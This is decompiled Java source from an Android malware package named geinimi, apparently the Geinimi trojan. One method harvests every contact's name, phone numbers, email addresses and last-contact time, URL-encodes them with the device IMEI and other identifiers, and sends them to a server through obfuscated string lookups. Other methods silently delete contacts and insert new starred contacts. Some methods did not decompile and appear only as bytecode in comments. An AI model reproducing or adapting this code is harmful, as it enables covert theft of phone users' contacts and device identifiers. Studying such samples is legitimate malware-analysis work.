package com.geinimi.c;

import android.content.ContentResolver;
import android.content.ContentValues;
import android.net.Uri;
import android.provider.Contacts.People;

public final class b {
    public static final String a = m.a(37);
    public static final String b = m.a(38);

    /* JADX WARNING: Removed duplicated region for block: B:12:0x0093  */
    /* JADX WARNING: Removed duplicated region for block: B:20:0x00e6  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static java.util.Vector a() {
        /*
            java.util.Vector r6 = new java.util.Vector
            r6.<init>()
            android.content.Context r0 = com.geinimi.c.k.a()
            android.content.ContentResolver r0 = r0.getContentResolver()
            android.net.Uri r1 = android.provider.Contacts.People.CONTENT_URI
            r2 = 0
            r3 = 0
            r4 = 0
            r5 = 0
            android.database.Cursor r7 = r0.query(r1, r2, r3, r4, r5)
            if (r7 == 0) goto L_0x0100
            boolean r0 = r7.moveToFirst()
            if (r0 == 0) goto L_0x0100
            java.lang.String r0 = "_id"
            int r8 = r7.getColumnIndex(r0)
            java.lang.String r0 = "display_name"
            int r9 = r7.getColumnIndex(r0)
            java.lang.String r0 = "last_time_contacted"
            int r10 = r7.getColumnIndex(r0)
        L_0x0031:
            java.lang.String r11 = r7.getString(r8)
            java.lang.String r12 = r7.getString(r9)
            long r0 = r7.getLong(r10)
            java.lang.String r2 = "yyyy-MM-dd kk:mm:ss"
            java.lang.CharSequence r0 = android.text.format.DateFormat.format(r2, r0)
            java.lang.String r13 = r0.toString()
            java.lang.StringBuilder r14 = new java.lang.StringBuilder
            r14.<init>()
            android.content.Context r0 = com.geinimi.c.k.a()
            android.content.ContentResolver r0 = r0.getContentResolver()
            android.net.Uri r1 = android.provider.Contacts.Phones.CONTENT_URI
            r2 = 0
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = "person = "
            java.lang.StringBuilder r3 = r3.append(r4)
            java.lang.StringBuilder r3 = r3.append(r11)
            java.lang.String r3 = r3.toString()
            r4 = 0
            r5 = 0
            android.database.Cursor r0 = r0.query(r1, r2, r3, r4, r5)
            if (r0 == 0) goto L_0x0091
            boolean r1 = r0.moveToFirst()
            if (r1 == 0) goto L_0x0091
        L_0x0078:
            java.lang.String r1 = "number"
            int r1 = r0.getColumnIndex(r1)
            java.lang.String r1 = r0.getString(r1)
            java.lang.StringBuilder r1 = r14.append(r1)
            java.lang.String r2 = ";"
            r1.append(r2)
            boolean r1 = r0.moveToNext()
            if (r1 != 0) goto L_0x0078
        L_0x0091:
            if (r0 == 0) goto L_0x0096
            r0.close()
        L_0x0096:
            java.lang.String r14 = r14.toString()
            java.lang.StringBuilder r15 = new java.lang.StringBuilder
            r15.<init>()
            android.content.Context r0 = com.geinimi.c.k.a()
            android.content.ContentResolver r0 = r0.getContentResolver()
            android.net.Uri r1 = android.provider.Contacts.ContactMethods.CONTENT_EMAIL_URI
            r2 = 0
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = "person = "
            java.lang.StringBuilder r3 = r3.append(r4)
            java.lang.StringBuilder r3 = r3.append(r11)
            java.lang.String r3 = r3.toString()
            r4 = 0
            r5 = 0
            android.database.Cursor r0 = r0.query(r1, r2, r3, r4, r5)
            if (r0 == 0) goto L_0x00e4
            boolean r1 = r0.moveToFirst()
            if (r1 == 0) goto L_0x00e4
        L_0x00cb:
            java.lang.String r1 = "data"
            int r1 = r0.getColumnIndex(r1)
            java.lang.String r1 = r0.getString(r1)
            java.lang.StringBuilder r1 = r15.append(r1)
            java.lang.String r2 = ";"
            r1.append(r2)
            boolean r1 = r0.moveToNext()
            if (r1 != 0) goto L_0x00cb
        L_0x00e4:
            if (r0 == 0) goto L_0x00e9
            r0.close()
        L_0x00e9:
            java.lang.String r0 = r15.toString()
            com.geinimi.c.c r1 = new com.geinimi.c.c
            r1.<init>(r12, r14, r0, r13)
            r6.add(r1)
            boolean r0 = r7.moveToNext()
            if (r0 != 0) goto L_0x0031
            if (r7 == 0) goto L_0x0100
            r7.close()
        L_0x0100:
            return r6
        */
        throw new UnsupportedOperationException("Method not decompiled: com.geinimi.c.b.a():java.util.Vector");
    }

    public static boolean a(String str) {
        ContentResolver contentResolver = k.a().getContentResolver();
        if (str == null) {
            return false;
        }
        contentResolver.delete(People.CONTENT_URI, "name=?", new String[]{str});
        return true;
    }

    public static boolean a(String str, String str2) {
        if (str == null) {
            return false;
        }
        a(str);
        try {
            ContentResolver contentResolver = k.a().getContentResolver();
            ContentValues contentValues = new ContentValues();
            contentValues.put("name", str);
            contentValues.put("starred", Integer.valueOf(1));
            Uri insert = contentResolver.insert(People.CONTENT_URI, contentValues);
            if (str2 != null) {
                contentValues.clear();
                Uri withAppendedPath = Uri.withAppendedPath(insert, "phones");
                if (str2.length() != 11 || !str2.startsWith("1")) {
                    contentValues.put("type", Integer.valueOf(3));
                } else {
                    contentValues.put("type", Integer.valueOf(2));
                }
                contentValues.put("number", str2);
                contentResolver.insert(withAppendedPath, contentValues);
            }
            return true;
        } catch (Exception e) {
            return false;
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:15:0x00d4  */
    /* JADX WARNING: Removed duplicated region for block: B:23:0x0123  */
    /* JADX WARNING: Removed duplicated region for block: B:26:0x0133  */
    /* JADX WARNING: Removed duplicated region for block: B:35:0x02c1 A[LOOP:0: B:8:0x0038->B:35:0x02c1, LOOP_END] */
    /* JADX WARNING: Removed duplicated region for block: B:36:0x02c4  */
    /* JADX WARNING: Removed duplicated region for block: B:37:0x0207 A[EDGE_INSN: B:37:0x0207->B:29:0x0207 ?: BREAK  , SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static boolean b(java.lang.String r13) {
        /*
            java.lang.String r6 = com.geinimi.c.k.f
            if (r6 != 0) goto L_0x0006
            r13 = 0
        L_0x0005:
            return r13
        L_0x0006:
            android.content.Context r0 = com.geinimi.c.k.a()
            android.content.ContentResolver r0 = r0.getContentResolver()
            android.net.Uri r1 = android.provider.Contacts.People.CONTENT_URI
            r2 = 0
            r3 = 0
            r4 = 0
            r5 = 0
            android.database.Cursor r7 = r0.query(r1, r2, r3, r4, r5)
            if (r7 == 0) goto L_0x02be
            boolean r0 = r7.moveToFirst()
            if (r0 == 0) goto L_0x02be
            java.lang.String r0 = "_id"
            int r8 = r7.getColumnIndex(r0)
            java.lang.String r0 = "display_name"
            int r9 = r7.getColumnIndex(r0)
            java.lang.String r0 = "last_time_contacted"
            int r10 = r7.getColumnIndex(r0)
            java.lang.StringBuilder r0 = new java.lang.StringBuilder
            r0.<init>()
            r11 = r0
        L_0x0038:
            java.lang.String r12 = r7.getString(r8)
            java.lang.String r0 = r7.getString(r9)
            java.lang.StringBuilder r1 = r11.append(r0)
            java.lang.String r2 = "@name@"
            r1.append(r2)
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            java.lang.String r2 = "-------postContacts"
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.StringBuilder r0 = r1.append(r0)
            r0.toString()
            long r0 = r7.getLong(r10)
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            java.lang.String r3 = "yyyy-MM-dd kk:mm:ss"
            java.lang.CharSequence r0 = android.text.format.DateFormat.format(r3, r0)
            java.lang.StringBuilder r0 = r2.append(r0)
            java.lang.String r1 = "@last@"
            java.lang.StringBuilder r0 = r0.append(r1)
            java.lang.String r0 = r0.toString()
            r11.append(r0)
            android.content.Context r0 = com.geinimi.c.k.a()
            android.content.ContentResolver r0 = r0.getContentResolver()
            android.net.Uri r1 = android.provider.Contacts.Phones.CONTENT_URI
            r2 = 0
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = "person = "
            java.lang.StringBuilder r3 = r3.append(r4)
            java.lang.StringBuilder r3 = r3.append(r12)
            java.lang.String r3 = r3.toString()
            r4 = 0
            r5 = 0
            android.database.Cursor r0 = r0.query(r1, r2, r3, r4, r5)
            if (r0 == 0) goto L_0x00d2
            boolean r1 = r0.moveToFirst()
            if (r1 == 0) goto L_0x00d2
        L_0x00a7:
            java.lang.String r1 = "number"
            int r1 = r0.getColumnIndex(r1)
            java.lang.String r1 = r0.getString(r1)
            java.lang.StringBuilder r2 = r11.append(r1)
            java.lang.String r3 = ";"
            r2.append(r3)
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            java.lang.String r3 = "Contacts phoneNumber"
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.StringBuilder r1 = r2.append(r1)
            r1.toString()
            boolean r1 = r0.moveToNext()
            if (r1 != 0) goto L_0x00a7
        L_0x00d2:
            if (r0 == 0) goto L_0x00d7
            r0.close()
        L_0x00d7:
            java.lang.String r0 = "@num@"
            r11.append(r0)
            android.content.Context r0 = com.geinimi.c.k.a()
            android.content.ContentResolver r0 = r0.getContentResolver()
            android.net.Uri r1 = android.provider.Contacts.ContactMethods.CONTENT_EMAIL_URI
            r2 = 0
            java.lang.StringBuilder r3 = new java.lang.StringBuilder
            r3.<init>()
            java.lang.String r4 = "person = "
            java.lang.StringBuilder r3 = r3.append(r4)
            java.lang.StringBuilder r3 = r3.append(r12)
            java.lang.String r3 = r3.toString()
            r4 = 0
            r5 = 0
            android.database.Cursor r0 = r0.query(r1, r2, r3, r4, r5)
            if (r0 == 0) goto L_0x0121
            boolean r1 = r0.moveToFirst()
            if (r1 == 0) goto L_0x0121
        L_0x0108:
            java.lang.String r1 = "data"
            int r1 = r0.getColumnIndex(r1)
            java.lang.String r1 = r0.getString(r1)
            java.lang.StringBuilder r1 = r11.append(r1)
            java.lang.String r2 = ";"
            r1.append(r2)
            boolean r1 = r0.moveToNext()
            if (r1 != 0) goto L_0x0108
        L_0x0121:
            if (r0 == 0) goto L_0x0126
            r0.close()
        L_0x0126:
            java.lang.String r0 = "@email@"
            r11.append(r0)
            int r0 = r11.length()
            r1 = 1024(0x400, float:1.435E-42)
            if (r0 <= r1) goto L_0x02c4
            java.lang.String r0 = r11.toString()
            java.lang.String r0 = java.net.URLEncoder.encode(r0)
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            java.lang.String r3 = "-------postContactsimei="
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.StringBuilder r2 = r2.append(r6)
            java.lang.String r3 = "&phone="
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.StringBuilder r2 = r2.append(r0)
            r2.toString()
            java.lang.StringBuilder r2 = new java.lang.StringBuilder
            r2.<init>()
            r3 = 49
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.StringBuilder r2 = r2.append(r6)
            r3 = 50
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.s
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 45
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.b()
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 46
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.c()
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 47
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.d()
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 67
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.e()
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 68
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.f()
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 69
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.String r3 = com.geinimi.c.k.g()
            java.lang.StringBuilder r2 = r2.append(r3)
            r3 = 56
            java.lang.String r3 = com.geinimi.c.m.a(r3)
            java.lang.StringBuilder r2 = r2.append(r3)
            java.lang.StringBuilder r0 = r2.append(r0)
            java.lang.String r0 = r0.toString()
            com.geinimi.c.l.a(r13, r0)
            r0 = r1
        L_0x0201:
            boolean r1 = r7.moveToNext()
            if (r1 != 0) goto L_0x02c1
            if (r7 == 0) goto L_0x020c
            r7.close()
        L_0x020c:
            int r1 = r0.length()
            if (r1 <= 0) goto L_0x02be
            java.lang.String r0 = r0.toString()
            java.lang.String r0 = java.net.URLEncoder.encode(r0)
            java.lang.StringBuilder r1 = new java.lang.StringBuilder
            r1.<init>()
            r2 = 49
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.StringBuilder r1 = r1.append(r6)
            r2 = 50
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.s
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 45
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.b()
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 46
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.c()
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 47
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.d()
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 67
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.e()
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 68
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.f()
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 69
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.String r2 = com.geinimi.c.k.g()
            java.lang.StringBuilder r1 = r1.append(r2)
            r2 = 56
            java.lang.String r2 = com.geinimi.c.m.a(r2)
            java.lang.StringBuilder r1 = r1.append(r2)
            java.lang.StringBuilder r0 = r1.append(r0)
            java.lang.String r0 = r0.toString()
            com.geinimi.c.l.a(r13, r0)
        L_0x02be:
            r13 = 1
            goto L_0x0005
        L_0x02c1:
            r11 = r0
            goto L_0x0038
        L_0x02c4:
            r0 = r11
            goto L_0x0201
        */
        throw new UnsupportedOperationException("Method not decompiled: com.geinimi.c.b.b(java.lang.String):boolean");
    }
}
